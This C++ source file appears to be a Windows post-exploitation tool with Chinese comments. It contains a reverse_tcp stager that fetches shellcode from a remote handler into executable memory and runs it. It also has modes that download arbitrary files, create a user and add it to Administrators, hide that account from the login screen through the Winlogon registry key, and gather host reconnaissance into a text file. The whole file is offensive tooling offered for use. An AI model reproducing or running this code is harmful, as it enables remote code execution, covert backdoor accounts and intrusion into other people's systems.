#include "stdafx.h"
#include <WinSock2.h>
#include <Windows.h>
#include <urlmon.h>
#include <Aclapi.h>
#include <lm.h>
#include <stdio.h>

#pragma comment(lib,"urlmon.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib,"WS2_32.lib")


///////////////////////////
/* init winsock */
void winsock_init() {
	WSADATA	wsaData;
	WORD 		wVersionRequested;

	wVersionRequested = MAKEWORD(2, 2);

	if (WSAStartup(wVersionRequested, &wsaData) < 0) {
		printf("ws2_32.dll is out of date.\n");
		WSACleanup();
		exit(1);
	}
}

/* a quick routine to quit and report why we quit */
void punt(SOCKET my_socket, char * error) {
	printf("Bad things: %s\n", error);
	closesocket(my_socket);
	WSACleanup();
	exit(1);
}

/* attempt to receive all of the requested data from the socket */
int recv_all(SOCKET my_socket, char * buffer, int len) {
	int    tret = 0;
	int    nret = 0;
	char * startb = buffer;
	while (tret < len) {
		nret = recv(my_socket, (char *)startb, len - tret, 0);
		startb += nret;
		tret += nret;

		if (nret == SOCKET_ERROR)
			punt(my_socket, "Could not receive data");
	}
	return tret;
}

/* establish a connection to a host:port */
SOCKET wsconnect(char * targetip, int port) {
	struct hostent *		target;
	struct sockaddr_in 	sock;
	SOCKET 			my_socket;

	/* setup our socket */
	my_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (my_socket == INVALID_SOCKET)
		punt(my_socket, "Could not initialize socket");

	/* resolve our target */
	target = gethostbyname(targetip);
	if (target == NULL)
		punt(my_socket, "Could not resolve target");


	/* copy our target information into the sock */
	memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);

	/* attempt to connect */
	if (connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)))
		punt(my_socket, "Could not connect to target");

	return my_socket;
}

int reverse_tcp(char*argv,int port) {
	ULONG32 size;
	char * buffer;
	void(*function)();

	winsock_init();

	/* connect to the handler */
	SOCKET my_socket = wsconnect(argv, port);

	/* read the 4-byte length */
	int count = recv(my_socket, (char *)&size, 4, 0);
	if (count != 4 || size <= 0)
		punt(my_socket, "read a strange or incomplete length value\n");

	/* allocate a RWX buffer */
	buffer = (char*)(VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE));
	if (buffer == NULL)
		punt(my_socket, "could not allocate buffer\n");

	/* prepend a little assembly to move our SOCKET value to the EDI register
	thanks mihi for pointing this out
	BF 78 56 34 12     =>      mov edi, 0x12345678 */
	buffer[0] = 0xBF;

	/* copy the value of our socket to the buffer */
	memcpy(buffer + 1, &my_socket, 4);

	/* read bytes into the buffer */
	count = recv_all(my_socket, buffer + 5, size);

	/* cast our buffer as a function and call it */
	function = (void(*)())buffer;
	function();

	return 0;
}
///////////////////////////


//登陆界面隐藏指定用户
void OnBnClickedChange(char*name)
{
	//定义一个返回打开的句柄
	HKEY hKey = NULL;
	DWORD szValue = 0;
	//注册表位置
	TCHAR * subKey = _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList");
	DWORD dwOptions = REG_OPTION_NON_VOLATILE;
	//新建一个相并返回一个打开的句柄
	LONG lRet = RegCreateKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, NULL, dwOptions, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &hKey, NULL);
	//写入值
	LONG lResult = RegSetValueExA(hKey, name, 0, REG_DWORD, (BYTE*)&szValue, sizeof(DWORD));

	if (lRet != ERROR_SUCCESS) {
		printf("RegCreateKeyEx_fail");
		exit(0);
	}
	else if (lRet != ERROR_SUCCESS)
	{
		printf("RegSetValueEx_fail!");
		exit(0);
	}
	printf("ok",name);
	//程序结束，关闭打开的hKEY
	RegCloseKey(hKey);
}
//类型转换
wchar_t *c2wc(const char *Str) {
	wchar_t *Wchar = new wchar_t[strlen(Str) + 1];
	mbstowcs(Wchar, Str, strlen(Str) + 1);
	return Wchar;
}
//下载函数
void download(wchar_t szurl[MAXBYTE],wchar_t szpaath[MAX_PATH]) {
	URLDownloadToFileW(NULL, szurl, szpaath, NULL, NULL);
}
//添加用户使用系统api
void apiAdd(wchar_t *name, wchar_t *pass) {
	USER_INFO_1 ui;
	DWORD dwLevel = 1;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;

	ui.usri1_name = name;
	ui.usri1_password = pass;
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT;
	ui.usri1_script_path = NULL;
	// 添加用户
	nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, &dwError);

	if (nStatus == NERR_Success)
		wprintf(L"User %s has been successfully added\n", name);
	else
		printf("A system error has occurred: %d\n", nStatus);

	wchar_t szAccountName[100] = { 0 };
	wcscpy(szAccountName, ui.usri1_name);
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname = szAccountName;
	// 添加到管理组
	nStatus = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
	if (nStatus == ERROR_SUCCESS)
		wprintf(L"User %s has been added to administrators\n", name);
	else
		printf("Fail to add %s to administrators. Error code: %d...\n", name, nStatus);
}
int main(int argc, char* argv[])
{
	
	if (!(argc > 1)) {
		printf(" [-h help]\n [-d url filename | download file] \n [-u user pass | add user and Join the administrator group ] \n [-s user | Login interface does not display user] \n [-r ip port |windows/meterpreter/reverse_tcp] \n [-i | system message]");
		exit(1);
	}

	if (strcmp(argv[1], "-h") == 0) {
		printf(" [-h help]\n [-d url filename | download file] \n [-u user pass | add user and Join the administrator group ] \n [-s user | Login interface does not display user] \n [-r ip port |windows/meterpreter/reverse_tcp] \n [-i | system message]");
		exit(1);
	}
	else if (strcmp(argv[1],"-d")==0){
		if((argv[2]==NULL)==true){
			printf("Please enter url");
			exit(1);
		}
		download(c2wc(argv[2]),c2wc(argv[3]));
		printf("%s""download ok");
		exit(0);
	}

	else if(strcmp(argv[1],"-u")==0)
	{
		if((argv[2]==NULL)==true){
			printf("Please enter user");
			exit(1);
		}
		else if((argv[3]==NULL)==true){
			printf("Please enter pass");
			exit(1);
		}
		printf("add user %s%s",argv[2],"\n");
		printf("add pass %s", argv[3],"\n");
		apiAdd(c2wc(argv[2]), c2wc(argv[3]));
		exit(0);
	}

	else if(strcmp(argv[1], "-s")==0)
	{
		if((argv[2]==NULL)==true){
			printf("Please enter user");
			exit(1);
		}
		OnBnClickedChange(argv[2]);
		exit(0);
	}

	else if(strcmp(argv[1],"-r")==0)
	{
		if((argv[2]==NULL)==true){
			printf("Please enter ip");
			exit(1);
		}
		else if((argv[3]==NULL)==true){
			printf("Please enter port");
			exit(1);
		}
		printf(argv[2],"\n");
		printf(argv[3],"\n");
		reverse_tcp(argv[2], atoi(argv[3]));
	}

	else if(strcmp(argv[1], "-i") == 0)
	{
		system("systeminfo>info.txt && ipconfig>>info.txt && netstat -aon>>info.txt && tasklist>>info.txt && net user>>info.txt && fsutil fsinfo drives>>info.txt&& wmic service list>>info.txt");
		printf("Enter info.txt ok");
	}
	else
	{
		printf(" [-h help]\n [-d url filename | download file] \n [-u user pass | add user and Join the administrator group ] \n [-s user | Login interface does not display user] \n [-r ip port |windows/meterpreter/reverse_tcp] \n [-i | system message]");
		exit(1);
	}

    return 0;
}
